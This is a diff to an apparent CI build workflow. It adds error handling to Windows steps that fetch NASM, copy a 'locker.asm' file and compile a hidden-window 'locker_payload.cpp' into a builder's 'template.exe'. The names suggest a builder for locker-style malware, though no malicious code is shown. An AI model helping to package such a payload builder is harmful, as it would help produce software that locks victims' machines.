@@ -23,15 +23,20 @@ jobs:
       run: |
         curl -L -o nasm.zip https://www.nasm.us/pub/nasm/releasebuilds/2.16.03/win64/nasm-2.16.03-win64.zip
         7z x nasm.zip -y
-        mkdir builder\Resources
-        dir nasm-*
-        copy nasm-2.16.03-win64\nasm.exe builder\Resources\nasm.exe
-        echo [SUCCESS] NASM extracted
+        mkdir builder\Resources 2>nul
+        for /d %%i in (nasm-*) do copy "%%i\nasm.exe" builder\Resources\nasm.exe
+        if exist builder\Resources\nasm.exe (
+          echo [SUCCESS] NASM extracted
+        ) else (
+          echo [ERROR] NASM not found!
+          dir nasm-*
+          exit /b 1
+        )
 
     - name: Copy locker.asm to Resources
       shell: cmd
       run: |
-        mkdir builder\Resources
+        mkdir builder\Resources 2>nul
         copy locker\locker.asm builder\Resources\locker.asm
         echo [SUCCESS] locker.asm copied
 
@@ -42,7 +47,7 @@ jobs:
         cd template
         g++ -static -O2 -mwindows locker_payload.cpp -o locker_payload.exe -luser32 -lkernel32 -ladvapi32
         if exist locker_payload.exe (
-          mkdir ..\builder\Resources
+          mkdir ..\builder\Resources 2>nul
           copy locker_payload.exe ..\builder\Resources\template.exe
           echo [SUCCESS] Template compiled
         ) else (
